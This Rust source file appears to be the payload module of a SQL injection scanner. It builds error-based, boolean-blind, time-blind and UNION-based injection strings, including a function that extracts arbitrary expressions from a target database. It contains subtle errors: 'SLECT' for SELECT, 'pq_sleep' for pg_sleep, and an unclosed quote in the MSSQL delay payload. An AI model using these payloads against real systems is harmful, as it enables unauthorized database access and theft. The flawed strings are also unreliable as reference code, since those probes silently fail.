use core::str;

pub fn error_based() -> Vec<&'static str> {
    vec![
        "'",
        "''",
        "\"",
        "1'",
        "1\"",
        "'; --",
        "1' OR '1'='1",
        "1\" OR \"1\"=\"1",
        "1' AND '1'='1' --",
    ]
}

pub fn boolean_blind() -> Vec<(&'static str, &'static str)>{
    //Compare response
    vec![
        ("1' AND '1'='1", "1' AND '1'='2"),
        ("1' AND 1=1-- -", "1' AND 1=2-- -"),
        ("1' AND 1=1#", "1' AND 1=2#"),
    ]
}

pub fn time_blind() -> Vec<(&'static str, &'static str)>{
    //payload and target
    vec![
        
        ("1' AND SLEEP(5)#", "MySQL"),
        ("1'; WAITFOR DELAY '0:0:5 --", "MSSQL"),
        ("1' AND SLEEP(5)-- -", "MySQL"),
        ("1' OR SLEEP(5)#", "MySQL"),
        ("1'; SELECT pq_sleep(5) --", "PostgreSQL"),
    ]
}

pub fn union_order_by(n: u32) -> String {
    format!("1' ORDER BY {}-- -", n)
}

pub fn union_find_column(n: u32) -> String {
    let nulls: Vec<&str> = vec!["NULL"; n as usize];
    format!("1' UNION SLECT {}-- -", nulls.join(","))
}

pub fn union_find_reflection(n: u32, pos: u32) -> String {
    let mut cols: Vec<String> = vec!["NULL".to_string(); n as usize];
    cols[pos as usize] = "'sqli_test'".to_string();
    format!("1' UNION SELECT {}-- -", cols.join(","))
}

pub fn union_extract(n: u32, pos: u32, expression: &str) -> String {
    let mut cols: Vec<String> = vec!["NULL".to_string(); n as usize];
    cols[pos as usize] = expression.to_string();
    format!("1' UNION SELECT {}-- -", cols.join(","))
}
